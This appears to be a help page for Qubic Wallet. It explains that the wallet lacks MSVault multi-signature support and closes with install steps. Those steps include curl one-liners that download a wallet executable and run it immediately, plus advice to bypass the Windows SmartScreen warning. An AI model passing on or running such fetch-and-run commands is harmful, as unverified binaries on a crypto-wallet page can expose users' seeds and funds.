> Two keys that must both sign is a different product from one key and a password.

Qubic Wallet does not support MSVault multi-signature. A search of the source for `msvault` and `multisig` returns nothing: there is no screen, no route and no signing path involving more than one key. The wallet's model is one password, one encrypted account and one key, which is a single-signature design by construction rather than by configuration.

## What exists in the build

The account model is password-derived: the password encrypts the seed, names the file, and unlocks it. There is no second key, no approval step from another party and no shared account object.

The routes confirm it: accounts are added, deleted and restored locally, with no notion of a co-signer anywhere in the flow.

## What multi-signature would require

A multi-signature account needs shared state - which keys exist, what threshold applies, which approvals have happened - and that state has to live somewhere both parties can see. This wallet keeps everything local, so the two designs do not meet in the middle.

Adding MSVault support would mean a new account type, a shared state source and a signing flow that waits for another party. None of that is present.

## The safe alternative today

Split the balance across separate accounts with separate passwords and separate backups, which gives you two keys that both matter, at the cost of managing two sets. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-multiple-accounts.md">multiple accounts guide</a> covers how they coexist and how to keep them apart.

For a large holding, the better trade is an offline machine rather than a shared account, which the <a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-cold-storage-custody.md">custody comparison</a> sets out.

## What to ignore

A wallet offering Qubic multi-signature today is describing something this build does not have. Check the release you actually run, which should be the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a>, and read its screens rather than a comparison table.

## FAQ

### Does Qubic Wallet support multi-signature?

No. There is no multi-signature code in the build.

### Is MSVault a feature I can enable?

No setting enables it. The capability is absent.

### Can two people share one account?

Only by sharing the same password and seed, which is not multi-signature and removes the point of it.

### What is the closest thing available?

Two accounts, two seeds, two backups, with the balance split between them.

### Will it be added?

Not in this release, and no date is published.

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.
